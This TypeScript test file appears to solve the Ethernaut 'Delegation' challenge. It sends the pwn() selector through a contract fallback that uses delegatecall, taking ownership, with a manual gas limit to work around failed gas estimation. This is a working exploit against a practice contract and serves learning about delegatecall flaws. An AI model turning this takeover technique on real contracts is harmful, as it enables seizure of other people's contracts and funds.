import {
  BigNumber,
  Contract,
  ContractTransaction,
  Signer,
  utils,
} from "ethers";
import { setupTest } from "./utils";

/**
 * The Delegation contract has a fallback function that forwards calls to the Delegate contract via `delegatecall`
 * Note that the `delegatecall` is executed on the caller's context, therefore the delegatee's methods will
 * access the Delegate's storage as if the method was borrowed and executed within the Delegate
 *
 * Calling the pwn method via the `delegatecall` will make us the owner of the Delegation contract.
 * In order to do this we need to compute the methodId of the `pwn()` method and pass it in as the msg.data
 * 
 * FAILED GAS ESTIMATION:
 * The catch about gas estimation is that the node will try out your tx with different gas values, and return the lowest
 * one for which your tx doesn’t fail. But it only looks at your tx, not at any of the internal calls it makes. This
 * means that if the contract code you’re calling has a try/catch that causes it not to revert if an internal call does,
 * you can get a gas estimation that would be enough for the caller contract, but not for the callee.
 * - Falsehoods that Ethereum programmers believe
 * @see https://gist.github.com/spalladino/a349f0ca53dbb5fc3914243aaf7ea8c6
 */

let eoa: Signer;
let challenge: Contract; // challenge contract

// Setup challenge level instance, eoa, attacker and before/after hooks
(async () => {
  const contractLevel = "0x73379d8B82Fda494ee59555f333DF7D44483fD58";
  const contractName = "Delegation";
  ({ eoa, challenge } = await setupTest(contractLevel, { contractName }));
})();

it("solves the challenge", async () => {
  const tx: ContractTransaction = await eoa.sendTransaction({
    from: await eoa.getAddress(),
    to: challenge.address,
    // pass in the methodId of pwn()
    data: utils.id("pwn()").substring(0, 10),
    // need to set gas manually - the gas estimation fails as the inner call does not propagate the error when it runs out of gas
    gasLimit: BigNumber.from("111111"),
  });
  await tx.wait();
});
